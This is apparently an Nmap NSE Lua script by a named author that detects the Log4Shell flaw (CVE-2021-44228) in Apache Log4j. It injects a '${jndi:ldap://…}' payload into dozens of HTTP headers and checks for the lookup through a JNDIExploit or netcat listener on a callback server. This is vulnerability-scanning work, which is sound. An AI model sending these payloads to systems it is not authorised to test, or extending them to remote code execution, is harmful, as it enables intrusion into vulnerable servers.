description = [[
Log4Shell - CVE-2021-44228

CVE-2021-44228 is a remote code execution (RCE) vulnerability in Apache Log4j 2.
An unauthenticated, remote attacker could exploit this flaw by sending a specially
crafted request to a server running a vulnerable version of log4j. The crafted
request uses a Java Naming and Directory Interface (JNDI) injection via a variety
of services including:

    -  Lightweight Directory Access Protocol (LDAP)
    -  Secure LDAP (LDAPS)
    -  Remote Method Invocation (RMI)
    -  Domain Name Service (DNS)

If the vulnerable server uses log4j to log requests, the exploit will then request
a malicious payload over JNDI through one of the services above from an
attacker-controlled server. Successful exploitation could lead to RCE.

Usage

Method A:
    - Download JNDIExploit from GitHub (https://github.com/giterlizzi/JNDIExploit/releases/download/v1.2/JNDIExploit.zip)

    - Start JNDIExploit server:
        java -jar JNDIExploit.jar

    - Run Nmap with --script log4shell.nse script
        nmap --script log4shell.nse [--script-args log4shell.callback-server=127.0.0.1:1389] [-p <port>] <target>

    - See JNDIExploit output for see the received LDAP query (log4shell/{target host}/{target port})
        [+] Received LDAP Query: log4shell/127.0.0.1/8080
        [!] Invalid LDAP Query: log4shell/127.0.0.1/8080

Method B:
    - Listen a TCP port with netcat (or ncat):
        ncat -vkl 1389   # Ncat
        nc -lvnp 1389    # Netcat

    - Run Nmap with --script log4shell.nse script
        nmap --script log4shell.nse [--script-args log4shell.callback-server=127.0.0.1:1389] [-p <port>] <target>

    - See the target IP address in netcat (or ncat) output:
        Ncat: Connection from 172.17.0.2.
        Ncat: Connection from 172.17.0.2:38898.
]]

author     = 'Giuseppe Di Terlizzi <giuseppe DIT diterlizzi AT nttdata DOT com>'
license    = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "safe", "external"}

---
-- @usage
-- nmap --script log4shell --script-args log4shell.callback-server=127.0.0.1:1389 -p <port> <host>
-- @args log4shell.callback-server  Callback server
-- @args log4shell.http-headers     Comma-separated list of HTTP headers
-- @args log4shell.http-method      HTTP method (default: GET)
-- @args log4shell.url-path         URL path (default: /)
--
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | log4shell: 
-- |   Payload: ${jndi:ldap://172.17.42.1:13890/log4shell}
-- |   Path: /
-- |   Method: GET
-- |   Headers: 
-- |     X-Api-Version: 200
-- |     [...]
-- |_  Note: (!) Inspect the callback server (172.17.42.1:13890) or web-application (172.17.42.2:8080) logs
--
-- @xmloutput
-- <script id="log4shell" output="[...]">
--   <elem key="Payload">${jndi:ldap://172.17.42.1:13890/log4shell}</elem>
--   <elem key="Path">//</elem>
--   <elem key="Method">GET</elem>
--   <table key="Headers">
--     <elem key="X-Api-Version">200 </elem>
--     <elem key="Referer">200 </elem>
--     <elem key="User-Agent">200 </elem>
--   </table>
--   <elem key="Note">(!) Inspect the callback server (172.17.42.1:389) or web-application (172.17.42.2:8080) logs</elem>
-- </script>
--
-- @changelog
-- 2021-12-11 - First release
-- 2021-12-13 - Test all headers known
--            - Changed output format
--            - Added log4shell.callback-server arg (instead of log4shell.exploit-server)
-- 2021-12-14 - Added log4shell.http-headers arg
--            - Improved output
-- 2021-12-15 - Improved XML result
--            - Added log4shell.http-method arg (default: GET)
--            - Added log4shell.url-path arg (default: /)
--            - Removed target info in LDAP URI
--

local http      = require "http"
local string    = require "string"
local table     = require "table"
local nmap      = require "nmap"
local stdnse    = require "stdnse"
local shortport = require "shortport"
local stringaux = require "stringaux"

portrule = shortport.http

action = function(host, port)

  local output = stdnse.output_table()

  local callback_server = stdnse.get_script_args(SCRIPT_NAME .. '.callback-server') or stdnse.get_script_args('log4shell.exploit-server') or '127.0.0.1:1389'
  local http_headers    = stdnse.get_script_args(SCRIPT_NAME .. '.http-headers') or nil
  local http_method     = stdnse.get_script_args(SCRIPT_NAME .. '.http-method') or 'GET'
  local url_path        = stdnse.get_script_args(SCRIPT_NAME .. '.url-path') or '/'

  local exploit_payload = string.format('${jndi:ldap://%s/log4shell}', callback_server)

  local payload_headers = {'X-Api-Version', 'User-Agent', 'Cookie', 'Referer', 'Accept-Language', 'Accept-Encoding', 'Upgrade-Insecure-Requests', 'Accept', 'upgrade-insecure-requests', 'Origin', 'Pragma', 'X-Requested-With', 'X-CSRF-Token', 'Dnt', 'Content-Length', 'Access-Control-Request-Method', 'Access-Control-Request-Headers', 'Warning', 'Authorization', 'TE', 'Accept-Charset', 'Accept-Datetime', 'Date', 'Expect', 'Forwarded', 'From', 'Max-Forwards', 'Proxy-Authorization', 'Range,', 'Content-Disposition', 'Content-Encoding', 'X-Amz-Target', 'X-Amz-Date', 'Content-Type', 'Username', 'IP', 'IPaddress', 'Hostname'}

  if http_headers ~= nil then
    payload_headers = stringaux.strsplit(',', http_headers)
  end

  output.Payload = exploit_payload
  output.Path    = url_path
  output.Method  = http_method
  output.Headers = {}

  for i, payload_header in ipairs(payload_headers) do

    stdnse.debug1(string.format('%s --> %s', payload_header, exploit_payload))

    local header = {
      [payload_header] = exploit_payload
    }

    local response = http.generic_request(host, port.number, http_method:upper(), url_path, { header = header, no_cache = true })
    local status   = response.status
    local status_string = http.get_status_string(response)

    if status == nil then
      -- Something went really wrong out there
      -- According to the NSE way we will die silently rather than spam user with error messages
    else
      output.Headers[payload_header] = status_string
    end

  end

  output.Note = string.format('(!) Inspect the callback server (%s) or web-application (%s:%s) logs', callback_server, host.ip, port.number)

  return output

end
